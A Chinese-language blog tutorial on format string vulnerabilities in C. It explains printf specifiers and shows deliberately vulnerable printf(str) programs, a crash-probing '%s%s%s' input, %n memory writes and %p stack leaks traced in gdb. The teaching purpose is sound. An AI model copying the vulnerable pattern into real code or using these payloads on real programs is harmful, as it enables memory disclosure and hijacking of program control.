@@ -1,0 +1,802 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Ginat_USB">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="格式化字符串漏洞基础参考：https:&#x2F;&#x2F;www.yuque.com&#x2F;cyberangel&#x2F;rg9gdm&#x2F;vh62v6#rVrvN 什么是格式化字符串在我们初识C语言的时候，我们经常会使用到printf这之类的函数，printf函数的第一个参数就是一个格式化字符串，就是程序员可以使用占位符，指定格式，这些占位符用来替代后面的变量或者是数据。简单总结就是说，我们可以在一个字符串中，执行某个位置应该输">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串漏洞">
+<meta property="og:url" content="http://example.com/2024/12/07/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Ginat_USB">
+<meta property="og:description" content="格式化字符串漏洞基础参考：https:&#x2F;&#x2F;www.yuque.com&#x2F;cyberangel&#x2F;rg9gdm&#x2F;vh62v6#rVrvN 什么是格式化字符串在我们初识C语言的时候，我们经常会使用到printf这之类的函数，printf函数的第一个参数就是一个格式化字符串，就是程序员可以使用占位符，指定格式，这些占位符用来替代后面的变量或者是数据。简单总结就是说，我们可以在一个字符串中，执行某个位置应该输">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-12-07T11:10:00.000Z">
+<meta property="article:modified_time" content="2025-02-25T14:09:59.281Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="原创">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>格式化字符串漏洞 - Ginat_USB</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Ginat_USB</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="格式化字符串漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Ginat_USB
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-12-07 19:10" pubdate>
+          2024年12月7日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          41 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">格式化字符串漏洞</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="格式化字符串漏洞基础"><a href="#格式化字符串漏洞基础" class="headerlink" title="格式化字符串漏洞基础"></a>格式化字符串漏洞基础</h1><p>参考：<a target="_blank" rel="noopener" href="https://www.yuque.com/cyberangel/rg9gdm/vh62v6#rVrvN">https://www.yuque.com/cyberangel/rg9gdm/vh62v6#rVrvN</a></p>
+<h2 id="什么是格式化字符串"><a href="#什么是格式化字符串" class="headerlink" title="什么是格式化字符串"></a>什么是格式化字符串</h2><p>在我们初识C语言的时候，我们经常会使用到printf这之类的函数，printf函数的第一个参数就是一个格式化字符串，就是程序员可以使用占位符，指定格式，这些占位符用来替代后面的变量或者是数据。简单总结就是说，我们可以在一个字符串中，执行某个位置应该输出怎么样的数据，使用占位符代替，在输出的时候函数会自动按照我们指定的格式，寻找参数并以我们预想的形式输出。</p>
+<h2 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h2><p>printf()函数的一般形式为:printf(“format”， 输出表列)，我们对format比较关心，看一下它的结构吧:<code>%[标志][输出最小宽度][.精度][长度]类型</code>，其中跟格式化字符串漏洞有关系的主要有以下几点:<br>1、输出最小宽度:用十进制整数来表示输出的最少位数。若实际位数多于定义的宽度，则按实际位数输出，若实际位数少于定义的宽度则补以空格或0。<br>2、类型:</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs mel">%c：输出字符，配上%n可用于向指定地址写数据。<br> <br>%d：输出十进制整数，配上%n可用于向指定地址写数据。<br> <br>%x：输出<span class="hljs-number">16</span>进制数据，如%i$x表示要泄漏偏移i处<span class="hljs-number">4</span>字节长的<span class="hljs-number">16</span>进制数据，%i$lx表示要泄漏偏移i处<span class="hljs-number">8</span>字节长的<span class="hljs-number">16</span>进制数据，<span class="hljs-number">32</span>bit和<span class="hljs-number">64</span>bit环境下一样。<br> <br>%p：输出<span class="hljs-number">16</span>进制数据，与%x基本一样，只是附加了前缀<span class="hljs-number">0</span>x，在<span class="hljs-number">32</span>bit下输出<span class="hljs-number">4</span>字节，在<span class="hljs-number">64</span>bit下输出<span class="hljs-number">8</span>字节，可通过输出字节的长度来判断目标环境是<span class="hljs-number">32</span>bit还是<span class="hljs-number">64</span>bit。<br> <br>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在<span class="hljs-number">32</span>bit和<span class="hljs-number">64</span>bit环境下一样，可用于读取GOT表等信息。<br> <br>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×<span class="hljs-number">10</span>$n表示将<span class="hljs-number">0x64</span>写入偏移<span class="hljs-number">10</span>处保存的指针所指向的地址（<span class="hljs-number">4</span>字节），而%$hn表示写入的地址空间为<span class="hljs-number">2</span>字节，%$hhn表示写入的地址空间为<span class="hljs-number">1</span>字节，<br><br>%$lln表示写入的地址空间为<span class="hljs-number">8</span>字节，在<span class="hljs-number">32</span>bit和<span class="hljs-number">64</span>bit环境下一样。有时，直接写<span class="hljs-number">4</span>字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。<br> <br>%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。<br></code></pre></td></tr></table></figure>
+
+<p>关于printf()函数的使用，正常我们使用printf()函数应该是这样的:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> str[<span class="hljs-number">100</span>];<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,str);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,str);<br></code></pre></td></tr></table></figure>
+
+<p>这是正确的使用方式，但是也有的人会这么用:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> str[<span class="hljs-number">100</span>];<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,str);<br><span class="hljs-built_in">printf</span>(str)<br></code></pre></td></tr></table></figure>
+
+<p>然后，悲剧就发生了，我们可以对比一下这两段代码，很明显，第二个程序中的printf()函数参数我们是可控的，我们在控制了format参数之后结合printf()函数的特性就可以进行相应的攻击。</p>
+<h2 id="特性一-printf-函数的参数个数不固定"><a href="#特性一-printf-函数的参数个数不固定" class="headerlink" title="特性一: printf()函数的参数个数不固定"></a>特性一: printf()函数的参数个数不固定</h2><p>我们可以利用这一特性进行越界数据的访问。我们先看一个正常的程序:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>    <span class="hljs-type">int</span> a=<span class="hljs-number">1</span>,b=<span class="hljs-number">2</span>,c=<span class="hljs-number">3</span>;<br>    <span class="hljs-type">char</span> buf[]=<span class="hljs-string">&quot;test&quot;</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %d %d %d\n&quot;</span>,buf,a,b,c);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们编译之后运行:</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">test </span>1 2 3<br></code></pre></td></tr></table></figure>
+
+<p>接下来我们做一下测试，我们增加一个printf()的format参数，改为:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %d %d %d %x\n&quot;</span>,buf,a,b,c)<br></code></pre></td></tr></table></figure>
+
+<p>编译后运行：</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">test </span>1 2 3 c30000<br></code></pre></td></tr></table></figure>
+
+<p>这里的c3000就是栈中处于3之下的数，所以只要我们能够控制format的，我们就可以一直读取内存数据。</p>
+<p>上一个例子只是告诉我们可以利用%x一直读取栈内的内存数据，可是这并不能满足我们的需求，我们要的是任意地址读取，当然，这也是可以的，我们通过下面的例子进行分析:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">200</span>];<br>    fgets(str,<span class="hljs-number">200</span>,<span class="hljs-built_in">stdin</span>);<br>    <span class="hljs-built_in">printf</span>(str);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们可以用%s来获取内存上的信息</p>
+<h2 id="特性二-利用-n格式符写入数据"><a href="#特性二-利用-n格式符写入数据" class="headerlink" title="特性二:利用%n格式符写入数据"></a>特性二:利用%n格式符写入数据</h2><p>%n是一个不经常用到的格式符，它的作用是把前面已经打印的长度写入某个内存地址，看下面的代码:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>  <span class="hljs-type">int</span> num=<span class="hljs-number">66666666</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Before: num = %d\n&quot;</span>, num);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d%n\n&quot;</span>, num, &amp;num);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After: num = %d\n&quot;</span>, num);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以发现我们用%n成功修改了num的值:</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">bingtangguan<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~/Desktop/format</span><span class="hljs-variable">$ </span>./format2<br><span class="hljs-symbol">Before:</span> num = <span class="hljs-number">66666666</span><br><span class="hljs-number">66666666</span><br><span class="hljs-symbol">After:</span> num = <span class="hljs-number">8</span><br></code></pre></td></tr></table></figure>
+
+<p>现在我们已经知道可以用构造的格式化字符串去访问栈内的数据，并且可以利用%n向内存中写入值，那我们是不是可以修改某一个函数的返回地址从而控制程序执行流程呢，到了这一步细心的同学可能已经发现了，%n的作用只是将前面打印的字符串长度写入到内存中，而我们想要写入的是一个地址，而且这个地址是很大的。这时候我们就需要用到printf()函数的第三个特性来配合完成地址的写入。</p>
+<h2 id="特性三-自定义打印字符串宽度"><a href="#特性三-自定义打印字符串宽度" class="headerlink" title="特性三:自定义打印字符串宽度"></a>特性三:自定义打印字符串宽度</h2><p>我们在上面的基础部分已经有提到关于打印字符串宽度的问题，在格式符中间加上一个十进制整数来表示输出的最少位数，若实际位数多于定义的宽度，则按实际位数输出，若实际位数少于定义的宽度则补以空格或0。我们把上一段代码做一下修改并看一下效果:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> num=<span class="hljs-number">66666666</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Before: num = %d\n&quot;</span>, num);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.100d%n\n&quot;</span>, num, &amp;num);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After: num = %d\n&quot;</span>, num);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到我们的num值被改为了100</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">bingtangguan<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~/Desktop/format</span><span class="hljs-variable">$ </span>./format2<br><span class="hljs-symbol">Before:</span> num = <span class="hljs-number">66666666</span><br><span class="hljs-number">00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="hljs-number">66666666</span><br><span class="hljs-symbol">After:</span> num = <span class="hljs-number">100</span><br></code></pre></td></tr></table></figure>
+
+<p>比如说我们要把0x8048000这个地址写入内存，我们要做的就是把该地址对应的10进制134512640作为格式符控制宽度即可:</p>
+<h2 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a>格式化字符串漏洞利用</h2><h3 id="程序崩溃"><a href="#程序崩溃" class="headerlink" title="程序崩溃"></a>程序崩溃</h3><p>拿到一个程序之后可以通过输入若干个%s来进行判断是否存在格式化字符串漏洞</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">%s%s%s%s%s%s%s%s%s%s%s%s%s%s<br></code></pre></td></tr></table></figure>
+
+<p>前面讲过没有参数的时候printf函数依然还可以输出格式化字符串对应的地址中的内容，所以如果存在格式化字符串漏洞，在输入一长串%s之后，printf会将%s作为格式化字符串，将对应地址中的内容以字符串的形式输出出来。但是栈上不可能每个值都对应了合法地址，所以数字对应的内容可能不存在，这个时候就会使程序崩溃。<br>在Linux中，存取无效的指针会引起进程受到SIGSEGV信号，从而使程序非正常终止并产生核心转储</p>
+<h3 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h3><h4 id="获取栈变量数值"><a href="#获取栈变量数值" class="headerlink" title="获取栈变量数值"></a>获取栈变量数值</h4><p>以这个程序为例</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>];<br>  <span class="hljs-type">int</span> a = <span class="hljs-number">1</span>, b = <span class="hljs-number">0x22222222</span>, c = <span class="hljs-number">-1</span>;<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>编译后，用gdb动态调试，并在printf处下断点，之后运行，我们输入<code>%p%p%p</code>,回车</p>
+<p>之后程序就停在了第一个<code>printf</code>处，这个<code>printf</code>有格式化字符串，我们来看它的栈</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span>:<span class="hljs-number">0000</span>│ esp <span class="hljs-number">0</span>xffffd02c —▸ <span class="hljs-number">0</span>x80491ea (main+<span class="hljs-number">100</span>) ◂— add esp, <span class="hljs-number">0</span>x20<br><span class="hljs-attribute">01</span>:<span class="hljs-number">0004</span>│-<span class="hljs-number">098</span> <span class="hljs-number">0</span>xffffd030 —▸ <span class="hljs-number">0</span>x804a00b ◂— &#x27;%<span class="hljs-number">08</span>x.%<span class="hljs-number">08</span>x.%<span class="hljs-number">08</span>x.%s\n&#x27;<br><span class="hljs-attribute">02</span>:<span class="hljs-number">0008</span>│-<span class="hljs-number">094</span> <span class="hljs-number">0</span>xffffd034 ◂— <span class="hljs-number">1</span><br><span class="hljs-attribute">03</span>:<span class="hljs-number">000</span>c│-<span class="hljs-number">090</span> <span class="hljs-number">0</span>xffffd038 ◂— <span class="hljs-number">0</span>x22222222 (&#x27;<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span>&#x27;)<br><span class="hljs-attribute">04</span>:<span class="hljs-number">0010</span>│-<span class="hljs-number">08</span>c <span class="hljs-number">0</span>xffffd03c ◂— <span class="hljs-number">0</span>xffffffff<br><span class="hljs-attribute">05</span>:<span class="hljs-number">0014</span>│-<span class="hljs-number">088</span> <span class="hljs-number">0</span>xffffd040 —▸ <span class="hljs-number">0</span>xffffd050 ◂— &#x27;%p.%p.%p&#x27;<br><span class="hljs-attribute">06</span>:<span class="hljs-number">0018</span>│-<span class="hljs-number">084</span> <span class="hljs-number">0</span>xffffd044 —▸ <span class="hljs-number">0</span>xffffd050 ◂— &#x27;%p.%p.%p&#x27;<br><span class="hljs-attribute">07</span>:<span class="hljs-number">001</span>c│-<span class="hljs-number">080</span> <span class="hljs-number">0</span>xffffd048 —▸ <span class="hljs-number">0</span>xf7fbe7b0 —▸ <span class="hljs-number">0</span>x80482c2 ◂— &#x27;GLIBC_2.<span class="hljs-number">34</span>&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>我们来详细解释一下：</p>
+<ul>
+<li><code>0xffffd02c</code>：这个地址的内存中存储了<code>printf</code>函数的返回值<code>0x80491ea</code></li>
+<li><code>0xffffd030</code>：这个地址下存储了格式化字符串<code>%08x.%08x.%08x.%s\n</code>在栈中的位置，即<code>0x804a00b</code></li>
+<li><code>0xffffd034</code>：这个位置存放了<code>a</code>的值<code>1</code></li>
+<li><code>0xffffd038</code>：这个地址存放了<code>b</code>的值<code>0x22222222</code></li>
+<li><code>0xffffd03c</code>：存了<code>c</code>的值，<code>-1</code>(以补码的形式)</li>
+</ul>
+<p>然后我们看第二个<code>printf</code></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span>:<span class="hljs-number">0000</span>│ esp <span class="hljs-number">0</span>xffffd03c —▸ <span class="hljs-number">0</span>x80491f9 (main+<span class="hljs-number">115</span>) ◂— add esp, <span class="hljs-number">0</span>x10<br><span class="hljs-attribute">01</span>:<span class="hljs-number">0004</span>│-<span class="hljs-number">088</span> <span class="hljs-number">0</span>xffffd040 —▸ <span class="hljs-number">0</span>xffffd050 ◂— &#x27;%p%p%p&#x27;<br><span class="hljs-attribute">02</span>:<span class="hljs-number">0008</span>│-<span class="hljs-number">084</span> <span class="hljs-number">0</span>xffffd044 —▸ <span class="hljs-number">0</span>xffffd050 ◂— &#x27;%p%p%p&#x27;<br><span class="hljs-attribute">03</span>:<span class="hljs-number">000</span>c│-<span class="hljs-number">080</span> <span class="hljs-number">0</span>xffffd048 —▸ <span class="hljs-number">0</span>xf7fbe7b0 —▸ <span class="hljs-number">0</span>x80482c2 ◂— &#x27;GLIBC_2.<span class="hljs-number">34</span>&#x27;<br><span class="hljs-attribute">04</span>:<span class="hljs-number">0010</span>│-<span class="hljs-number">07</span>c <span class="hljs-number">0</span>xffffd04c —▸ <span class="hljs-number">0</span>x804919d (main+<span class="hljs-number">23</span>) ◂— add ebx, <span class="hljs-number">0</span>x2e63<br><span class="hljs-attribute">05</span>:<span class="hljs-number">0014</span>│ eax <span class="hljs-number">0</span>xffffd050 ◂— &#x27;%p%p%p&#x27;<br><span class="hljs-attribute">06</span>:<span class="hljs-number">0018</span>│-<span class="hljs-number">074</span> <span class="hljs-number">0</span>xffffd054 ◂— <span class="hljs-number">0</span>x7025 /* &#x27;%p&#x27; */<br><span class="hljs-attribute">07</span>:<span class="hljs-number">001</span>c│-<span class="hljs-number">070</span> <span class="hljs-number">0</span>xffffd058 —▸ <span class="hljs-number">0</span>xf7ffda40 ◂— <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+
+<p>由于第二次<code>printf</code>没有给参数，所以触发了格式化字符串漏洞，第一个<code>%p</code>解析了出了<code>0xffffd044</code>中的内容，<code>0xffffd050</code>，第二个解析出了<code>0xf7fbe7b0</code>，第三个解析了<code>0x804919d</code>所以打印出了<code>0xffffd050 0xf7fbe7b0 0x804919d</code>。当然也可以使用其他的占位符来达到其他的效果</p>
+<h4 id="获取栈变量对应字符串"><a href="#获取栈变量对应字符串" class="headerlink" title="获取栈变量对应字符串"></a>获取栈变量对应字符串</h4><p>将<code>%p</code>改成<code>%s</code>，程序会以字符串的形式输出栈中内容。</p>
